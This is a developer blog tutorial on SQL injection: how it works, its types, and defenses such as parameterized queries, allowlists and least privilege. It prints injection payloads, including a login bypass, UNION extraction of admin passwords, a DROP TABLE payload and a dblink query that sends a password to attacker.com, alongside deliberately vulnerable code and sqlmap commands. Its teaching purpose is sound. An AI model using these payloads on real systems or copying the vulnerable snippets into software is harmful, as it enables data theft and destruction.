---
layout: post
title: "SQL Injection: How It Works and How to Prevent It"
date: "2026-05-26 00:00:00 +0530"
slug: sql-injection-explained-and-prevention
description: "A developer's guide to SQL injection — how attackers exploit vulnerable queries, the different attack types, and how parameterized queries and ORMs prevent them."
categories: ["SQL", "wiki"]
tags: ["sql injection", "security", "owasp", "parameterized queries", "database", "web security", "backend", "prepared statements"]
---

SQL injection has topped security vulnerability lists for over two decades. Despite being one of the most well-documented attack types in existence, it still shows up in production applications regularly — and when it does, the consequences range from data theft to complete database takeover. Understanding exactly how it works is the best way to make sure you never accidentally write vulnerable code.

## How SQL Injection Works

The core vulnerability is simple: user-supplied input is concatenated directly into a SQL query, allowing an attacker to change the structure of the query.

```python
# Vulnerable login function
def login(username: str, password: str) -> User:
    query = f"""
        SELECT * FROM users
        WHERE username = '{username}'
        AND password = '{password}'
    """
    return db.execute(query).fetchone()
```

For a normal user, this works as expected. But an attacker sends:

```
username: admin' --
password: anything
```

The resulting query becomes:

```sql
SELECT * FROM users
WHERE username = 'admin' --' AND password = 'anything'
```

The `--` starts a SQL comment, commenting out the password check entirely. The attacker is now logged in as `admin` without knowing the password.

## Types of SQL Injection

### Classic (In-Band) Injection

The attacker gets query results back in the HTTP response. The login bypass above is one example. Another is extracting data by causing a query to return extra rows:

```
Input: ' OR '1'='1
Resulting query: SELECT * FROM users WHERE id = '' OR '1'='1'
```

`'1'='1'` is always true, so this dumps the entire `users` table.

### UNION-Based Injection

If the application renders query results, the attacker can inject a `UNION SELECT` to append data from other tables:

```
Input: 1 UNION SELECT username, password, null FROM admin_users --
```

```sql
SELECT id, name, email FROM products WHERE id = 1
UNION SELECT username, password, null FROM admin_users --
```

This returns the admin table's usernames and passwords in place of product data.

### Blind Injection

Sometimes the application doesn't show query results — just a generic "found" or "not found" response. Blind injection extracts data one bit at a time by asking true/false questions:

```sql
-- Is the first character of the admin password 'a'?
SELECT * FROM users WHERE id = 1 AND SUBSTRING(
    (SELECT password FROM users WHERE username='admin'), 1, 1
) = 'a'

-- Is the database version >= 5?
SELECT * FROM users WHERE id = 1 AND 1=(
    SELECT 1 FROM information_schema.tables LIMIT 1
)
```

Tools like `sqlmap` automate this, extracting entire databases through thousands of such requests in minutes.

### Time-Based Blind Injection

When even the response gives no hints, inject a sleep:

```sql
-- If admin exists, wait 5 seconds
SELECT * FROM users WHERE id = 1; IF (
    SELECT COUNT(*) FROM users WHERE username='admin'
) > 0 WAITFOR DELAY '00:00:05'--
```

The attacker measures the response time to infer the answer.

### Out-of-Band Injection

The attacker uses database features to exfiltrate data via DNS or HTTP to a server they control:

```sql
-- PostgreSQL — triggers a DNS lookup with the admin password as subdomain
SELECT dblink_send_query(
    'host=' || (SELECT password FROM users WHERE username='admin') || '.attacker.com',
    'SELECT 1'
);
```

## Prevention: Parameterized Queries

The only reliable fix is to never concatenate user input into queries. Use parameterized queries (also called prepared statements), where the SQL structure is fixed and user data is passed separately.

**Python with psycopg2 (PostgreSQL):**

```python
# Vulnerable
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

# Safe — ? or %s is a placeholder; data is passed separately
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
```

The database driver handles escaping. No matter what the attacker sends in `username`, it cannot change the query structure — it's always treated as a string value.

**Node.js with pg:**

```javascript
// Vulnerable
const query = `SELECT * FROM users WHERE username = '${username}'`;

// Safe
const query = "SELECT * FROM users WHERE username = $1 AND password = $2";
const result = await pool.query(query, [username, password]);
```

**Java with JDBC:**

```java
// Vulnerable
String query = "SELECT * FROM users WHERE username = '" + username + "'";

// Safe
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

## ORMs Are Not Magic

ORMs use parameterized queries internally for their standard operations, so this is safe:

```python
# SQLAlchemy — safe, uses parameterized query internally
user = db.query(User).filter(User.username == username).first()
```

But ORMs often let you drop to raw SQL — and that's where injection sneaks back in:

```python
# Dangerous — raw SQL with f-string
user = db.execute(f"SELECT * FROM users WHERE username = '{username}'").first()

# Safe — even with raw SQL, use parameters
user = db.execute(
    "SELECT * FROM users WHERE username = :username",
    {"username": username}
).first()
```

The rule: if you're writing any SQL as a string and inserting user data into it, use bind parameters — always.

## Dynamic Queries and the Tricky Cases

Some things are harder to parameterize. Table names, column names, and `ORDER BY` clauses can't be parameterized in most databases.

```python
# Can't use a parameter for column name — this fails:
cursor.execute("SELECT * FROM users ORDER BY %s", (sort_column,))

# Safe approach: allowlist
ALLOWED_SORT_COLUMNS = {"username", "created_at", "email"}

if sort_column not in ALLOWED_SORT_COLUMNS:
    raise ValueError("Invalid sort column")

query = f"SELECT * FROM users ORDER BY {sort_column}"  # safe — validated first
cursor.execute(query)
```

Never use a blocklist (trying to filter out dangerous characters). Use an allowlist of known-safe values.

## Defense in Depth

Parameterized queries are the primary defense, but layer additional protections:

**Least privilege:** the database user your app connects with should only have the permissions it needs. No `DROP TABLE`, no `GRANT`, no cross-database access.

```sql
-- Application user with minimal permissions
GRANT SELECT, INSERT, UPDATE ON orders TO app_user;
GRANT SELECT ON products TO app_user;
-- No DELETE, no DDL
```

**Input validation:** validate data types and formats at the application layer before they reach the database — not as a substitute for parameterized queries, but as an additional layer.

**WAF (Web Application Firewall):** tools like ModSecurity or AWS WAF can detect and block injection patterns. They're not foolproof, but they stop automated scanners.

**Error handling:** don't expose database errors to users — they reveal table names, column names, and sometimes query structure.

```python
try:
    result = db.execute(query, params)
except Exception as e:
    logger.error("Database error", exc_info=e)
    raise HTTPException(status_code=500, detail="Internal server error")
    # Never: raise HTTPException(detail=str(e))
```

## Testing for SQL Injection

Before an attacker does, test your own application:

```bash
# Manual: try common payloads in all input fields
' OR '1'='1
1; DROP TABLE users--
' UNION SELECT null,null,null--
admin'--

# Automated: sqlmap (only on apps you own/have permission to test)
$ sqlmap -u "https://yourapp.com/login" --data="username=test&password=test" --batch
```

```
$ sqlmap -u "http://localhost:5000/users?id=1" --dbs
[*] available databases [2]:
[*] information_schema
[*] myapp
```

Running sqlmap against your own app in a test environment before launch is a good habit.

## Conclusion

SQL injection is preventable with one discipline: always use parameterized queries and never concatenate user input into SQL strings. ORMs help but don't eliminate the risk — raw SQL escape hatches can reintroduce it. Layer your defenses with least-privilege database users, proper error handling, and input validation. The pattern to internalize is: query structure is fixed, user data is passed as parameters — always.
